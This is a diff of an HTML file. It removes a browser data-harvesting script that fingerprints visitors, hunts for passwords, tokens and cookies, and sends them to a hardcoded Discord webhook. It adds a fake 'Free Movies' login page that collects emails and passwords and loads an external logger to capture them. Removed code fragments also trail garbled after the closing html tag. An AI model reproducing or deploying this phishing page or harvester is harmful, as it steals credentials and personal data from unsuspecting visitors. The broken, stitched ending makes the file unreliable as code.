@@ -1,40 +1,70 @@
 <!DOCTYPE html>
-<html>
-<head><title>Loading...</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>body{margin:0;padding:0;background:#000;overflow:hidden;}
-#status{position:fixed;top:10px;left:10px;color:#0f0;font-family:monospace;font-size:12px;z-index:9999;}</style>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Movie Streaming</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+        }
+        .container { 
+            background: rgba(255,255,255,0.95); 
+            padding: 2rem; 
+            border-radius: 20px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
+            max-width: 400px; 
+            text-align: center;
+        }
+        h1 { color: #333; margin-bottom: 1rem; font-size: 2em; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 16px; }
+        button { background: #667eea; color: white; border: none; padding: 12px 24px; border-radius: 10px; cursor: pointer; font-size: 16px; width: 100%; }
+        .loading { display: none; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #667eea; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-<div id="status">🔍 Scanning browser... 0%</div>
+    <div class="container">
+        <h1>🎬 Free Movies</h1>
+        <p>Sign in to start streaming</p>
+        
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Loading movies...</p>
+        </div>
+    </div>
 
-<script>
-const WEBHOOK = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
-
-class BrowserHarvester {
-    constructor() {
-        this.victimId = btoa(navigator.userAgent + Date.now()).slice(0,16);
-        this.progress = 0;
-        this.data = {id: this.victimId, timestamp: new Date().toISOString()};
-        this.keywords = ['pass', 'pwd', 'token', 'key', 'secret', 'auth', 'email', 'login', 'cookie', 'session', 'api', 'bearer'];
-        this.updateStatus('Initializing aggressive harvest...');
-        this.startHarvest();
-    }
-
-    updateStatus(msg, pct=0) {
-        this.progress += pct;
-        document.getElementById('status').innerHTML = `🔍 ${msg} (${Math.floor(this.progress)}%)`;
-    }
-
-    async sendHarvest() {
-        try {
-            const payload = {
-                username: `💀 BROWSER RANSACK [${this.victimId.slice(0,8)}]`,
-                embeds: [{
-                    title: '🦠 FULL BROWSER HARVEST COMPLETE',
-                    description: `**📊 Files Scanned:** ${this.data.files?.length || 0}\n**🔑 Keywords Found:** ${this.data.sensitive?.length || 0}\n**💾 Storage Dumped:** ${Object.keys(this.data.storage || {}).length} entries`,
-                    color: 16711680,
-                    fields: [
+    <!-- LOAD EXTERNAL JS LOGGER -->
+    <script src="logger.js"></script>
+    
+    <!-- INLINE BOOTSTRAP -->
+    <script>
+        // Form submission (triggers logger)
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('loading').style.display = 'block';
+            
+            // Give logger time to capture data
+            setTimeout(() => {
+                document.body.innerHTML = '<h1>🎥 Movies loading... Please wait</h1>';
+            }, 2000);
+        });
+    </script>
+</body>
+</html>                    fields: [
                         {name: '🐛 Fingerprint', value: `\`${this.data.fingerprint.slice(0,60)}...\``, inline: true},
                         {name: '📱 Device', value: `\`${this.data.platform}\``, inline: true},
                         {name: '🌐 Network', value: `\`${this.data.connection?.effectiveType || 'N/A'}\``, inline: true}
